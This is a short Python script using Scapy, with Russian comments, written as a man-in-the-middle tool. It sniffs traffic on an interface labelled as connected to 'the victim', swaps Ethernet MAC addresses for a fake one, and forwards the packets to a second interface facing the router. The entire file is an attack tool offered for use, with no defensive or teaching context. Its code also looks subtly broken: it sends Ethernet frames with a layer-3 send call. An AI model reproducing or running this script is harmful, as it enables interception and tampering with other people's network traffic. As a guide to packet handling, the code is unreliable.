from scapy.all import *
import os

def mitm(interface1, interface2, fake_mac_address):
    def callback(packet):
        if packet.haslayer(Ether):
            eth_layer = packet.getlayer(Ether)
            
            # Перенаправляем пакет с изменением MAC-адреса отправителя на фейковый
            if packet.sniffed_on == interface1:
                original_source_mac = eth_layer.src
                eth_layer.src = fake_mac_address
                send(packet, iface=interface2, verbose=False)
                eth_layer.src = original_source_mac
            elif packet.sniffed_on == interface2:
                original_dest_mac = eth_layer.dst
                eth_layer.dst = fake_mac_address
                send(packet, iface=interface1, verbose=False)
                eth_layer.dst = original_dest_mac

    # Запуск sniffer на обоих интерфейсах
    sniff(iface=[interface1, interface2], prn=callback)

if __name__ == "__main__":
    # Параметры задержания
    interface1 = "eth0"  # Интерфейс, подключенный к жертве
    interface2 = "eth1"  # Интерфейс, подключенный к сети или роутеру
    fake_mac_address = "00:11:22:33:44:55"  # Фиктивный MAC-адрес для подмены

    mitm(interface1, interface2, fake_mac_address)